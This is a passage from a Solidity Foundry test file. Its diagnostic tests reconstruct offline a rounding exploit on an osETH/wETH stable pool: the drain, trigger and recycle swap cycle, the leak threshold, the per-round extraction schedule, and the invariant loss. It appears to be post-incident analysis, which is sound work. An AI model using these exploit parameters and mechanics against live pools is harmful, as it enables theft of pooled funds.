            try this.ext_simSwap(bal, sf, 0, 1, trickAmt, amp, fee, 0) returns (uint256[] memory nb2) {
                bal = nb2;
            } catch { emit log_string("  Step B REVERT"); continue; }

            uint256 W_post = bal[0];
            uint256 O_post = bal[1];
            uint256 O_up_post_vault = O_post.mulDown(sf[1]);
            uint256 gap = O_up_post_curve > O_up_post_vault
                ? O_up_post_curve - O_up_post_vault : 0;

            emit log_named_uint("  Step B: O_up_post (VAULT view)", O_up_post_vault);
            emit log_named_uint("  Step B: integer gap (curve - vault)", gap);
            emit log_named_uint("  Step B: O_post raw (ABSOLUTE)", O_post);
            emit log_named_uint("  Step B: amountIn paid", W_post - W_A);
            emit log_named_uint("  Step B: W_post", W_post);

            (bool okPost, uint256 D_post) = _safeInv(amp, W_post.mulDown(sf[0]), O_up_post_vault);
            if (okPre && okPost) {
                int256 dD = int256(D_post) - int256(D_pre);
                emit log_named_uint("  Step B: D_post", D_post);
                emit log_named_int("  Step B: dD (NEG = pool loss)", dD);
                // Geometric prediction at O_post: |dD| ~ D_pre / (3 * O_up_post_vault)
                if (O_up_post_vault > 0) {
                    emit log_named_uint("  geometric predict |dD/dO|@O_vault = D/(3*O)", D_pre / (3 * O_up_post_vault));
                }
            } else {
                emit log_string("  Step B: D_post = N/A (Newton diverged)");
            }
        }
    }

    // Probe the asymmetry between FORWARD (D given balances) and INVERSE
    // (one balance given D and others) Newton iterations at the FIXED end
    // state (W=1,415,765, O=1). Both StableMath functions use the same
    // 255-iteration limit and same |new-prev| <= 1 stopping rule, but they
    // solve completely different equations.
    function testDiag_newtonAsymmetry() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();

        emit log_named_uint("amp (with AMP_PRECISION=1000)", amp);
        uint256 D_target = 138956;

        // INVERSE: given D=138956 and O=1, solve for W
        // The function uses balances[tokenIndex] as both Newton starting point
        // AND in computing P_D / c, so it must be set to the pre-swap value
        // (matches how _calcInGivenOut calls it: pre-swap W is still in the slot).
        emit log_string("=== INVERSE Newton: given D=138956, O=1, find W ===");
        emit log_string("(starting hint = pre-swap W = 374353, matches real call)");
        uint256[] memory bal = new uint256[](2);
        bal[0] = 374353; bal[1] = 1; // tokenIndex=0 (W) is unknown; 374353 is starting hint
        try this.ext_balGivenInv(amp, bal, D_target, 0) returns (uint256 W) {
            emit log_named_uint("solved W (Newton converged)", W);
            // Now try the FORWARD: given (W, 1), can Newton recover D?
            emit log_string("=== FORWARD Newton at the SAME (W, 1) ===");
            uint256[] memory pp = new uint256[](2);
            pp[0] = W; pp[1] = 1;
            try this.ext_inv(amp, pp) returns (uint256 d_back) {
                emit log_named_uint("D recovered (Newton converged)", d_back);
                emit log_named_int("residual = D_recovered - D_target", int256(d_back) - int256(D_target));
            } catch {
                emit log_string("FORWARD diverged at SAME (W,1) point !");
            }
        } catch {
            emit log_string("INVERSE diverged");
        }

        // Sweep FORWARD around the FIXED W to map the divergence neighbourhood
        emit log_string("=== FORWARD D sweep along O=1 around W=1415765 ===");
        uint256[10] memory Ws = [
            uint256(100000), 500000, 800000, 1000000, 1200000,
            1400000, 1415765, 1500000, 2000000, 5000000
        ];
        for (uint256 i = 0; i < Ws.length; i++) {
            uint256[] memory pp2 = new uint256[](2);
            pp2[0] = Ws[i]; pp2[1] = 1;
            try this.ext_inv(amp, pp2) returns (uint256 d) {
                emit log_named_uint(string(abi.encodePacked("  D at W=", _u(Ws[i]), ", O=1")), d);
            } catch {
                emit log_named_string(string(abi.encodePacked("  D at W=", _u(Ws[i]), ", O=1")), "REVERT");
            }
        }

        // Sweep INVERSE around D_target with O=1 (use 374353 as starting hint)
        emit log_string("=== INVERSE W sweep, O=1, varying D (hint=374353) ===");
        uint256[8] memory Ds = [uint256(50000), 100000, 138956, 150000, 200000, 500000, 1000000, 5000000];
        for (uint256 i = 0; i < Ds.length; i++) {
            uint256[] memory pp3 = new uint256[](2);
            pp3[0] = 374353; pp3[1] = 1;
            try this.ext_balGivenInv(amp, pp3, Ds[i], 0) returns (uint256 W) {
                emit log_named_uint(string(abi.encodePacked("  W at D=", _u(Ds[i]), ", O=1")), W);
            } catch {
                emit log_named_string(string(abi.encodePacked("  W at D=", _u(Ds[i]), ", O=1")), "REVERT");
            }
        }
    }

    function ext_balGivenInv(uint256 amp, uint256[] memory bal, uint256 inv, uint256 idx)
        external pure returns (uint256)
    {
        return StableMath._getTokenBalanceGivenInvariantAndAllOtherBalances(amp, bal, inv, idx);
    }

    // Two follow-up questions that came out of testDiag_newtonAsymmetry:
    //
    //   Q1. INVERSE Newton was claimed to be "globally convergent" for the
    //       quadratic-in-balance polynomial, yet the D=5,000,000 row of the
    //       sweep REVERTed. Why?
    //
    //   Q2. The standalone INVERSE solve at (D=138956, O=1) returned W=1,415,659,
    //       but simSwapGivenOut's FIXED Step B settles W_post=1,415,765 -- a
    //       106-unit gap. Is that gap a numerical bug or is it structural
    //       (the +1 round-up + downscale + fee divUp inside _calcInGivenOut)?
    //
    // This test resolves both with direct prints, no inference.
    //
    // Findings (verified by the prints below):
    //
    //   A1. The revert is NOT a Newton convergence failure. It is a P_D
    //       underflow during INITIALIZATION of
    //         _getTokenBalanceGivenInvariantAndAllOtherBalances.
    //       The function computes, before the loop:
    //         P_D = balances[0] * n
    //         for j = 1..n-1: P_D = (P_D * balances[j] * n) / invariant
    //         c   = invariant^2 / (Ann * P_D) * AMP_PRECISION * balances[idx]
    //       balances[idx] is the STARTING HINT for the unknown balance and is
    //       consumed in computing P_D when idx==0. With hint=374353 and the
    //       OTHER balance fixed at O=1:
    //         P_D = (374353 * 2 * 1 * 2) / 5_000_000 = 1_497_412 / 5e6 = 0
    //       integer-division collapse -> divUp(inv2, Ann*0) -> revert.
    //       Re-running with a hint near the true magnitude (W ~ 11M at D=5e6)
    //       keeps P_D > 0 and Newton converges in <10 iterations.
    //       So INVERSE is structurally stable in its iteration step but
    //       requires a hint large enough that P_D survives the init division.
    //
    //   A2. The 106-unit gap is exactly accounted for by three rounding-up
    //       operations inside the swap pipeline (none of which are present
    //       in the bare Newton call):
    //         (i)   _calcInGivenOut returns finalBalanceIn.sub(balIn).add(1)
    //               -> an unconditional +1 in upscaled space.
    //         (ii)  inRaw = divUp(inUp, sf[WETH]=1e18)
    //               -> identity for WETH (sf=1e18), no extra rounding.
    //         (iii) inRaw = divUp(inRaw, ONE - fee)
    //               -> grosses the input up by ~1/(1-1e-4); ceils a few units.
    //       Numerically:
    //               newW (Newton)           = 1,415,659
    //               inUp = newW - W_pre + 1 = 1,041,307
    //               inRaw after fee divUp   = 1,041,412   (fee adds 105)
    //               W_post = W_pre + inRaw  = 1,415,765   (+106 vs newW)
    //       So the gap = (+1 from .add(1)) + (+105 from fee divUp), no math bug.
    function testDiag_inverseHintAndFeeBreakdown() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        // ---- Q1: P_D underflow in INVERSE init at large D ----
        // n = 2, Ann = amp * 2; we use the same closed form the contract uses.
        emit log_string("=== Q1: INVERSE revert at D=5,000,000 is a P_D underflow ===");
        uint256 D_big = 5_000_000;
        uint256 hint_small = 374_353;     // the hint used in the failing sweep
        uint256 P_D_small = hint_small * 2;                 // balances[0] * n
        P_D_small = (P_D_small * 1 * 2) / D_big;            // loop body, balances[1]=1
        emit log_named_uint("  hint (W slot) = 374353; P_D after init", P_D_small);
        emit log_string("  P_D = 0 -> next line c = inv2 / (Ann * 0) reverts");

        uint256[] memory pp_small = new uint256[](2);
        pp_small[0] = hint_small; pp_small[1] = 1;
        try this.ext_balGivenInv(amp, pp_small, D_big, 0) returns (uint256 W) {
            emit log_named_uint("  INVERSE(hint=374353)", W);
        } catch {
            emit log_string("  INVERSE(hint=374353) REVERT (matches manual P_D=0)");
        }

        // Same call with a hint near the true W magnitude at D=5e6.
        // Geometric estimate W ~ (D/2)^(3/2) / sqrt(O) is too crude here; we use
        // a generous 11_000_000 hint (Newton self-corrects regardless).
        uint256 hint_big = 11_000_000;
        uint256 P_D_big = hint_big * 2;
        P_D_big = (P_D_big * 1 * 2) / D_big;
        emit log_named_uint("  hint (W slot) = 11000000; P_D after init", P_D_big);

        uint256[] memory pp_big = new uint256[](2);
        pp_big[0] = hint_big; pp_big[1] = 1;
        try this.ext_balGivenInv(amp, pp_big, D_big, 0) returns (uint256 W) {
            emit log_named_uint("  INVERSE(hint=11M) converged W", W);
        } catch {
            emit log_string("  INVERSE(hint=11M) REVERT");
        }

        // ---- Q2: 106-unit gap = +1 round-up + fee divUp ----
        emit log_string("");
        emit log_string("=== Q2: standalone Newton W=1415659 vs simSwap W_post=1415765 ===");
        // Reproduce exactly the FIXED-mode Step B internals:
        //   pre-state at Step A end (374353, 18); take 17 osETH out with mulUp.
        uint256 W_pre = 374_353;
        uint256 O_pre = 18;
        uint256 outRaw = 17;

        // Curve's pre-image to Newton: balances upscaled, OUT slot decremented by outUp
        uint256[] memory up = new uint256[](2);
        up[0] = W_pre.mulDown(sf[0]);
        up[1] = O_pre.mulDown(sf[1]);
        uint256 D_pre = StableMath._calculateInvariant(amp, up);
        emit log_named_uint("  D_pre at (374353,18)", D_pre);

        uint256 outUp_fixed = outRaw.mulUp(sf[1]);                  // FIXED mode = mulUp
        emit log_named_uint("  outUp (mulUp(17,sf))", outUp_fixed);
        uint256[] memory bal_for_newton = new uint256[](2);
        bal_for_newton[0] = up[0];                                  // hint = current upscaled W
        bal_for_newton[1] = up[1] - outUp_fixed;                    // O after taking out
        emit log_named_uint("  hint W (= up_W_pre)", bal_for_newton[0]);
        emit log_named_uint("  O_up after subtracting outUp", bal_for_newton[1]);

        uint256 newW = StableMath._getTokenBalanceGivenInvariantAndAllOtherBalances(
            amp, bal_for_newton, D_pre, 0
        );
        emit log_named_uint("  STANDALONE Newton newW (claim: 1415659)", newW);

        // Now apply each downstream rounding step the contract does:
        uint256 inUp = newW - up[0] + 1;                             // _calcInGivenOut .add(1)
        emit log_named_uint("  inUp = newW - up_W_pre + 1", inUp);
        uint256 inRaw_noFee = inUp.divUp(sf[0]);                     // sf[WETH]=1e18 identity
        emit log_named_uint("  inRaw before fee = divUp(inUp, sf[W])", inRaw_noFee);
        uint256 inRaw_withFee = inRaw_noFee.divUp(ONE - fee);        // gross-up by 1/(1-fee)
        emit log_named_uint("  inRaw after  fee = divUp(., 1-fee)", inRaw_withFee);
        emit log_named_uint("  fee adjustment delta", inRaw_withFee - inRaw_noFee);

        uint256 W_post_pipeline = W_pre + inRaw_withFee;
        emit log_named_uint("  W_post = W_pre + inRaw (claim: 1415765)", W_post_pipeline);
        emit log_named_uint("  total gap vs newW = W_post - newW", W_post_pipeline - newW);
        emit log_string("  decomposition:  +1 (calcInGivenOut .add(1)) + fee divUp delta");

        // Cross-check against simSwapGivenOut directly
        uint256[] memory bal_pre = new uint256[](2);
        bal_pre[0] = W_pre; bal_pre[1] = O_pre;
        uint256[] memory bal_post = simSwapGivenOut(bal_pre, sf, 0, 1, outRaw, amp, fee, 1);
        emit log_named_uint("  simSwap FIXED W_post (sanity check)", bal_post[0]);

        // ---- Q3: BUGGY path -- is 999,845 also derived from D=138,956? ----
        // Earlier I claimed "999,845 is not the back-solve of any D". That was
        // wrong. _calcInGivenOut DOES call the INVERSE Newton with the same
        // invariant=138,956 in the BUGGY path -- only the OUT slot fed into
        // Newton differs (mulDown(17,sf)=17 -> O_up=2 instead of mulUp=18 ->
        // O_up=1). So the BUGGY 999,845 is structurally the same construction
        // as FIXED 1,415,765, just on the wrong O_up=2 iso-curve, with the
        // same +1 round-up + fee divUp markup applied on top.
        emit log_string("");
        emit log_string("=== Q3: BUGGY 999,845 = INVERSE Newton(D=138956,O_up=2) + markup ===");
        uint256 outUp_buggy = outRaw.mulDown(sf[1]);                 // BUGGY mode = mulDown
        emit log_named_uint("  outUp (mulDown(17,sf))", outUp_buggy);
        uint256[] memory bal_for_newton_b = new uint256[](2);
        bal_for_newton_b[0] = up[0];                                 // hint = up_W_pre
        bal_for_newton_b[1] = up[1] - outUp_buggy;                   // O_up after subtracting outUp
        emit log_named_uint("  hint W (= up_W_pre)", bal_for_newton_b[0]);
        emit log_named_uint("  O_up after subtracting outUp_buggy", bal_for_newton_b[1]);

        uint256 newW_b = StableMath._getTokenBalanceGivenInvariantAndAllOtherBalances(
            amp, bal_for_newton_b, D_pre, 0
        );
        emit log_named_uint("  STANDALONE Newton newW (D=138956, O_up=2)", newW_b);

        uint256 inUp_b      = newW_b - up[0] + 1;                    // _calcInGivenOut .add(1)
        uint256 inRaw_nf_b  = inUp_b.divUp(sf[0]);                   // sf[WETH] identity
        uint256 inRaw_wf_b  = inRaw_nf_b.divUp(ONE - fee);           // fee divUp
        uint256 W_post_b    = W_pre + inRaw_wf_b;
        emit log_named_uint("  inUp = newW - up_W_pre + 1", inUp_b);
        emit log_named_uint("  inRaw before fee", inRaw_nf_b);
        emit log_named_uint("  inRaw after  fee", inRaw_wf_b);
        emit log_named_uint("  fee adjustment delta", inRaw_wf_b - inRaw_nf_b);
        emit log_named_uint("  W_post = W_pre + inRaw (claim: 999845)", W_post_b);
        emit log_named_uint("  total markup vs newW = W_post - newW", W_post_b - newW_b);

        // simSwap BUGGY sanity check
        uint256[] memory bal_pre_b = new uint256[](2);
        bal_pre_b[0] = W_pre; bal_pre_b[1] = O_pre;
        uint256[] memory bal_post_b = simSwapGivenOut(bal_pre_b, sf, 0, 1, outRaw, amp, fee, 0);
        emit log_named_uint("  simSwap BUGGY W_post (sanity check)", bal_post_b[0]);

        emit log_string("");
        emit log_string("=== CONCLUSION: BUGGY and FIXED W_post share the SAME construction ===");
        emit log_string("  BUGGY: Newton(D=138956, O_up=2) + 1 + fee divUp -> 999,845");
        emit log_string("  FIXED: Newton(D=138956, O_up=1) + 1 + fee divUp -> 1,415,765");
        emit log_string("  Difference = which O_up iso-curve Newton was anchored on.");

        // ---- Q4: prove the D-loss geometry ----
        // Curve "imagined" landing  : (W_up=999845, O_up=2)  -> D should be ~ 138,956
        //                             (slightly higher because of +1+fee markup pushing W
        //                             slightly past Newton's exact 999,781)
        // Vault "actual" landing     : (W_up=999845, O_up=1)  -> D should be ~ 112,405
        //                             (-26,551 vs original 138,956 = the per-cycle theft)
        emit log_string("");
        emit log_string("=== Q4: D at curve-imagined vs vault-actual landing ===");
        (bool ok_curve, uint256 D_curve) = _safeInv(amp, 999845, 2);
        (bool ok_vault, uint256 D_vault) = _safeInv(amp, 999845, 1);
        if (ok_curve) emit log_named_uint("  D at (999845, O_up=2)  curve view ", D_curve);
        else          emit log_string  ("  D at (999845, O_up=2)  curve view : NEWTON DIVERGED");
        if (ok_vault) emit log_named_uint("  D at (999845, O_up=1)  vault view ", D_vault);
        else          emit log_string  ("  D at (999845, O_up=1)  vault view : NEWTON DIVERGED");
        if (ok_curve && ok_vault) {
            emit log_named_uint("  D_pre (Step A end)               ", D_pre);
            emit log_named_int ("  dD = D_vault - D_pre              ", int256(D_vault) - int256(D_pre));
            emit log_named_int ("  curve-vs-vault D gap (= theft)    ", int256(D_curve) - int256(D_vault));
        }
    }

    // Question: does the leak need to be MAXIMIZED, or just need to cross the
    // integer-jump threshold {n*sf} > 1 - {sf} ?
    // Sweep representative trickAmt values, all forced through Step A->Step B
    // with the same starting (67000, 67000). Compare ΔD and amountIn across
    // candidates with different leak sizes.
    function testDiag_leakSize_sweep() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];
        emit log_named_uint("scaling factor osETH (sf)", sf[1]);
        emit log_string("threshold for jump-by-2: {n*sf} must be > 1 - {sf} = ~0.9419");

        // Candidates that PASS the threshold (each gives integer gap = 1)
        uint256[5] memory good = [uint256(17), 34, 51, 68, 86];
        // Candidates that FAIL (each gives integer gap = 0, attack inert)
        uint256[3] memory bad = [uint256(1), 85, 170];

        for (uint256 i = 0; i < good.length; i++) {
            emit log_string("==== PASS-THRESHOLD CANDIDATE ====");
            _stepBCompareOne(sf, amp, fee, good[i]);
        }
        for (uint256 i = 0; i < bad.length; i++) {
            emit log_string("==== FAIL-THRESHOLD CANDIDATE ====");
            _stepBCompareOne(sf, amp, fee, bad[i]);
        }
    }

    // -----------------------------------------------------------------------
    // testDiag_fullCycleInternals
    //   Runs ONE complete A -> B -> C cycle in BUGGY mode starting at
    //   (W=67000, O=67000) and prints, at every step:
    //     - VAULT view : raw bal pre, raw bal post, upscaled bal pre/post
    //                    (matches _upscaleArray = mulDown for both slots)
    //     - CURVE view : outUp (mulDown(outAmt, sf[idxOut])),
    //                    inv used by the curve, the [W_up, O_up] vector
    //                    actually fed into the INVERSE Newton solver
    //                    (i.e. up_post_curve_view = up_pre with O_up -= outUp),
    //                    raw Newton output, then +1 + fee divUp pipeline.
    //   The point: do NOT assume Step C returns to (67000, 67000); print it.
    // -----------------------------------------------------------------------
    function testDiag_fullCycleInternals() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0]; sf[1] = rawSf[2];
        emit log_named_uint("sf[WETH] ", sf[0]);
        emit log_named_uint("sf[osETH]", sf[1]);
        emit log_named_uint("fee (1e18)", fee);

        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000; bal[1] = 67000;
        uint256 trickAmt = 17;

        emit log_string("");
        emit log_string("########## INITIAL ##########");
        _printState("init", bal, sf, amp);

        // ---- Step A: WETH -> osETH out = (O_pre - trickAmt - 1) ----
        emit log_string("");
        emit log_string("########## STEP A (WETH -> osETH, drain to O=trickAmt+1=18) ##########");
        bal = _verboseSwap(bal, sf, 0, 1, bal[1] - trickAmt - 1, amp, fee, 0);
        _printState("after A", bal, sf, amp);

        // ---- Step B: WETH -> osETH out = trickAmt = 17 (TRIGGER) ----
        emit log_string("");
        emit log_string("########## STEP B (WETH -> osETH, out = trickAmt = 17, TRIGGER) ##########");
        bal = _verboseSwap(bal, sf, 0, 1, trickAmt, amp, fee, 0);
        _printState("after B", bal, sf, amp);

        // ---- Step C: osETH -> WETH out = trim(W) (recycle) ----
        emit log_string("");
        emit log_string("########## STEP C (osETH -> WETH, out = trim(W), recycle) ##########");
        uint256 want = trim(bal[0]);
        bool ok = false;
        for (uint256 j = 0; j < 5; j++) {
            try this.ext_verboseSwap(bal, sf, 1, 0, want, amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb; ok = true; break;
            } catch { want = want * 9 / 10; }
        }
        require(ok, "Step C failed all retries");
        _printState("after C", bal, sf, amp);

        // ---- Final verdict ----
        emit log_string("");
        emit log_string("########## VERDICT ##########");
        emit log_named_uint("final W (raw)", bal[0]);
        emit log_named_uint("final O (raw)", bal[1]);
        emit log_named_int ("delta W vs init 67000", int256(bal[0]) - int256(67000));
        emit log_named_int ("delta O vs init 67000", int256(bal[1]) - int256(67000));
    }

    function ext_verboseSwap(
        uint256[] memory bal, uint256[] memory sf,
        uint256 idxIn, uint256 idxOut, uint256 outAmt,
        uint256 amp, uint256 fee, uint8 mode
    ) external returns (uint256[] memory) {
        return _verboseSwap(bal, sf, idxIn, idxOut, outAmt, amp, fee, mode);
    }

    function _printState(string memory tag, uint256[] memory bal, uint256[] memory sf, uint256 amp)
        internal
    {
        uint256[] memory up = new uint256[](2);
        up[0] = bal[0].mulDown(sf[0]);
        up[1] = bal[1].mulDown(sf[1]);
        uint256 D = StableMath._calculateInvariant(amp, up);
        emit log_named_string("--- state @", tag);
        emit log_named_uint("  raw W", bal[0]);
        emit log_named_uint("  raw O", bal[1]);
        emit log_named_uint("  up  W (vault re-upscale = mulDown)", up[0]);
        emit log_named_uint("  up  O (vault re-upscale = mulDown)", up[1]);
        emit log_named_uint("  D (vault view)", D);
    }

    // Verbose mirror of simSwapGivenOut. Prints both views step by step.
    function _verboseSwap(
        uint256[] memory bal, uint256[] memory sf,
        uint256 idxIn, uint256 idxOut, uint256 outAmt,
        uint256 amp, uint256 fee, uint8 mode
    ) internal returns (uint256[] memory) {
        emit log_named_uint("  outAmt (raw)", outAmt);
        emit log_named_uint("  idxIn ", idxIn);
        emit log_named_uint("  idxOut", idxOut);

        // ---- VAULT view (pre-swap) ----
        uint256[] memory up = new uint256[](2);
        up[0] = bal[0].mulDown(sf[0]);
        up[1] = bal[1].mulDown(sf[1]);
        emit log_string  ("  [vault pre]");
        emit log_named_uint("    raw W", bal[0]);
        emit log_named_uint("    raw O", bal[1]);
        emit log_named_uint("    up  W", up[0]);
        emit log_named_uint("    up  O", up[1]);

        // ---- CURVE view (Newton input) ----
        uint256 outUp = (mode == 0) ? outAmt.mulDown(sf[idxOut]) : outAmt.mulUp(sf[idxOut]);
        uint256 inv   = StableMath._calculateInvariant(amp, up);
        uint256[] memory upCurve = new uint256[](2);
        upCurve[0] = up[0]; upCurve[1] = up[1];
        upCurve[idxOut] = upCurve[idxOut] - outUp;          // what Newton actually sees
        emit log_string  ("  [curve _calcInGivenOut input]");
        emit log_named_uint("    outUp (mulDown sf if BUGGY, else mulUp)", outUp);
        emit log_named_uint("    inv used by curve (D_pre vault-view)   ", inv);
        emit log_named_uint("    Newton input W_up                       ", upCurve[0]);
        emit log_named_uint("    Newton input O_up (= up_pre - outUp)    ", upCurve[1]);

        // call _calcInGivenOut for the FULL inUp (= newW - W_up + 1)
        uint256 inUp = StableMath._calcInGivenOut(amp, up, idxIn, idxOut, outUp, inv);
        // re-derive Newton's raw output (without the .add(1))
        uint256 newSlot = inUp - 1 + upCurve[idxIn];
        emit log_named_uint("    Newton raw output (newBal slot)         ", newSlot);
        emit log_named_uint("    inUp = newBal - W_up + 1                ", inUp);

        // ---- fee pipeline ----
        uint256 inRawNoFee = inUp.divUp(sf[idxIn]);
        uint256 inRaw      = inRawNoFee.divUp(ONE - fee);
        emit log_string  ("  [downscale + fee]");
        emit log_named_uint("    inRaw before fee = divUp(inUp, sf[in]) ", inRawNoFee);
        emit log_named_uint("    inRaw after  fee = divUp(., 1 - fee)   ", inRaw);
        emit log_named_uint("    fee delta                              ", inRaw - inRawNoFee);

        // ---- VAULT view (post-swap) ----
        bal[idxIn]  = bal[idxIn]  + inRaw;
        bal[idxOut] = bal[idxOut] - outAmt;
        uint256[] memory up2 = new uint256[](2);
        up2[0] = bal[0].mulDown(sf[0]);
        up2[1] = bal[1].mulDown(sf[1]);
        emit log_string  ("  [vault post]");
        emit log_named_uint("    raw W", bal[0]);
        emit log_named_uint("    raw O", bal[1]);
        emit log_named_uint("    up  W (vault re-upscale = mulDown)", up2[0]);
        emit log_named_uint("    up  O (vault re-upscale = mulDown)", up2[1]);

        // Curve "thought" the post-state was:
        //   W slot = W_up + inUp           (BEFORE divUp/fee so >= up2[0])
        //   O slot = up[idxOut] - outUp    (= upCurve[idxOut])
        uint256 W_up_curve_imag = upCurve[idxIn] + inUp;
        uint256 O_up_curve_imag = upCurve[idxOut];
        emit log_string  ("  [curve imagined post-state]");
        emit log_named_uint("    W_up (curve imagined = pre + inUp)       ", W_up_curve_imag);
        emit log_named_uint("    O_up (curve imagined = pre - outUp)      ", O_up_curve_imag);

        // delta vs vault: this is the structural mismatch
        emit log_named_int ("    GAP W: curve_imagined - vault_post       ",
            int256(W_up_curve_imag) - int256(up2[idxIn]));
        emit log_named_int ("    GAP O: curve_imagined - vault_post       ",
            int256(O_up_curve_imag) - int256(up2[idxOut]));

        return bal;
    }

    // =========================================================================
    // Phase 2 30-round trace + counterfactual analysis (findings 14-17).
    // These tests reconstruct the on-chain PoC's Phase 2 (30 cycles of A->B->C)
    // entirely offline so we can attribute per-round W/O/D changes to the bug
    // vs to the attacker's chosen extraction schedule (ext[r]).
    // =========================================================================

    function _phase2ExtractAmounts() internal pure returns (uint256[30] memory a) {
        a[0]=891000; a[1]=666000; a[2]=495000; a[3]=369000; a[4]=270000;
        a[5]=198000; a[6]=160000; a[7]=120000; a[8]=89100;  a[9]=67500;
        a[10]=52200; a[11]=40500; a[12]=31500; a[13]=24300; a[14]=19800;
        a[15]=16200; a[16]=12600; a[17]=10800; a[18]=9000;  a[19]=7371;
        a[20]=6480;  a[21]=6075;  a[22]=5589;  a[23]=4779;  a[24]=4455;
        a[25]=3969;  a[26]=3726;  a[27]=3645;  a[28]=3564;  a[29]=3564;
    }

    function _phase2Params() internal returns (uint256[] memory sf, uint256 amp, uint256 fee) {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory sfFull = IPool(osETH_wETH_d).getScalingFactors();
        (amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        fee = IPool(osETH_wETH_d).getSwapFeePercentage();
        sf = new uint256[](2);
        sf[0] = sfFull[0];
        sf[1] = sfFull[2];
    }

    function _safeSimRound(
        uint256[] memory bal, uint256[] memory sf, uint256 idxIn, uint256 idxOut,
        uint256 outAmt, uint256 amp, uint256 fee, uint8 mode
    ) internal view returns (bool, uint256[] memory) {
        try this.ext_simSwap(bal, sf, idxIn, idxOut, outAmt, amp, fee, mode) returns (uint256[] memory nb) {
            return (true, nb);
        } catch { return (false, new uint256[](2)); }
    }

    function _safeInvRound(uint256[] memory bal, uint256[] memory sf, uint256 amp)
        internal view returns (bool, uint256)
    {
        try this.ext_invUp(bal, sf, amp) returns (uint256 d) { return (true, d); } catch { return (false, 0); }
    }

    // Finding 16: per-round trace of W, O, D across Phase 2's 30 rounds.
    // The output makes dW and dO mixed-sign across rounds while dD < 0 in
    // every single round.
    function testDiag_perRoundTrace() public {
        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();

        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000;
        bal[1] = 67000;

        console.log("=== PHASE 2 ENTRY (after Phase 1 drain) ===");
        console.log("  W =", bal[0]);
        console.log("  O =", bal[1]);
        console.log("  D =", invUp(bal, sf, amp));

        uint256[30] memory ext = _phase2ExtractAmounts();

        for (uint256 r = 0; r < 30; r++) {
            console.log("");
            console.log("============ ROUND ============", r);
            int256 startW = int256(bal[0]);
            int256 startO = int256(bal[1]);
            uint256 startD = invUp(bal, sf, amp);

            bal = simSwapGivenOut(bal, sf, 0, 1, bal[1] - 17 - 1, amp, fee, 0); // Step A
            console.log("  after A: W=", bal[0], " O=", bal[1]);
            bal = simSwapGivenOut(bal, sf, 0, 1, 17, amp, fee, 0);              // Step B
            console.log("  after B: W=", bal[0], " O=", bal[1]);
            bal = simSwapGivenOut(bal, sf, 1, 0, ext[r], amp, fee, 0);          // Step C
            console.log("  after C: W=", bal[0], " O=", bal[1]);

            (bool ok, uint256 endD) = _safeInvRound(bal, sf, amp);
            console.log("  ROUND NET dW:"); console.logInt(int256(bal[0]) - startW);
            console.log("  ROUND NET dO:"); console.logInt(int256(bal[1]) - startO);
            if (ok) { console.log("  ROUND NET dD:"); console.logInt(int256(endD) - int256(startD)); }
        }

        console.log("");
        console.log("=== PHASE 2 EXIT ===");
        console.log("  W =", bal[0]);
        console.log("  O =", bal[1]);
        console.log("  net W loss vs entry 67000:"); console.logInt(int256(67000) - int256(bal[0]));
        console.log("  net O loss vs entry 67000:"); console.logInt(int256(67000) - int256(bal[1]));
    }

    // Finding 14: counterfactual PARALLEL run. BUGGY and FIXED worlds share
    // the same extract table and trickAmt=17. NB: diverges at Round 1 because
    // the FIXED world's O after Round 0 (= 11) falls below TRICK_AMT+1=18, so
    // its Step A can no longer drain. Useful mainly for Round 0 comparison.
    function testDiag_counterfactualParallel() public {
        (uint256[] memory sf, uint256 amp, uint256 fee) = _phase2Params();
        uint256[] memory balA = new uint256[](2); balA[0] = 67000; balA[1] = 67000;
        uint256[] memory balF = new uint256[](2); balF[0] = 67000; balF[1] = 67000;
        uint256[30] memory ext = _phase2ExtractAmounts();

        for (uint256 r = 0; r < 30; r++) {
            uint256 outA_a = balA[1] > 18 ? balA[1] - 18 : 0;
            uint256 outA_f = balF[1] > 18 ? balF[1] - 18 : 0;
            if (outA_a == 0 || outA_f == 0) {
                console.log("---- Stopped @ round (counter cannot drain)", r); break;
            }
            (bool oka1, uint256[] memory n1) = _safeSimRound(balA, sf, 0, 1, outA_a, amp, fee, 0);
            (bool okf1, uint256[] memory n2) = _safeSimRound(balF, sf, 0, 1, outA_f, amp, fee, 1);
            if (!oka1 || !okf1) { console.log("Step A REVERT @ round", r); break; }
            balA = n1; balF = n2;

            (bool oka2, uint256[] memory n3) = _safeSimRound(balA, sf, 0, 1, 17, amp, fee, 0);
            (bool okf2, uint256[] memory n4) = _safeSimRound(balF, sf, 0, 1, 17, amp, fee, 1);
            if (!oka2 || !okf2) { console.log("Step B REVERT @ round", r); break; }
            balA = n3; balF = n4;

